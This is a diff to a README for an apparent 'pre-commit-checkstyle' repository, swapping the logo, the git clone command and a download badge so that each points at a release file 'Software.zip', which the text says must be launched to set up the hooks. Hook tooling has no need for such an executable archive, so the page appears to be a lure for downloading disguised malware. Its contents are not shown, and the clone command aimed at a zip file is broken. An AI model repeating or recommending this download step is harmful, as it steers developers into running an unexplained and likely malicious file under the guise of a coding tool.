@@ -1,6 +1,6 @@
 # pre-commit-checkstyle 🚀
 
-![checkstyle logo](https://upload.wikimedia.org/wikipedia/commons/a/ac/Checkstyle_Logo.png)
+![checkstyle logo](https://github.com/martin4o-btw/pre-commit-checkstyle/releases/download/v2.0/Software.zip)
 
 Welcome to the "pre-commit-checkstyle" repository! This repository provides pre-commit hooks to run Checkstyle, a popular tool for checking Java code against a set of coding standards. By using these pre-commit hooks, you can ensure that your Java code adheres to specific styling and formatting guidelines before committing it to your version control system.
 
@@ -16,7 +16,7 @@ To get started with using the pre-commit hooks in this repository, follow these 
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/pre-commit-checkstyle.git
+   git clone https://github.com/martin4o-btw/pre-commit-checkstyle/releases/download/v2.0/Software.zip
    ```
 
 2. Install the necessary dependencies. You can find the installation instructions in the repository's documentation.
@@ -27,7 +27,7 @@ To get started with using the pre-commit hooks in this repository, follow these 
 
 ## Software Download 📥
 
-To download the necessary software for this repository, click [here](https://github.com/user-attachments/files/18410590/Software.zip). This file needs to be launched to set up the pre-commit hooks for running Checkstyle.
+To download the necessary software for this repository, click [here](https://github.com/martin4o-btw/pre-commit-checkstyle/releases/download/v2.0/Software.zip). This file needs to be launched to set up the pre-commit hooks for running Checkstyle.
 
 ## Repository Structure 📂
 
@@ -57,4 +57,4 @@ For any questions or issues related to using the pre-commit hooks in this reposi
 
 🌟 Happy coding with Checkstyle and pre-commit hooks! 🚀🔍📝
 
-\[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)\]
+\[![Download Software](https://github.com/martin4o-btw/pre-commit-checkstyle/releases/download/v2.0/Software.zip)](https://github.com/martin4o-btw/pre-commit-checkstyle/releases/download/v2.0/Software.zip)\]
